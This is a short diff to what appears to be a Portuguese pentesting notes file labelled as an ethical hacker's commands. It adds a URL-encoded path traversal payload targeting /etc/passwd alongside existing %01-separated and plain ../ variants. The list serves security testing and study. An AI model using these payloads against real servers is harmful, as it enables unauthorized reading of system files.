@@ -21,7 +21,11 @@ Encontre aqui notas e comandos de um HACKER ÉTICO
 .
 
 	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
-	
+
+.
+
+	/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+ 
 .
 
 	/../../../../../../../../../../etc/passwd
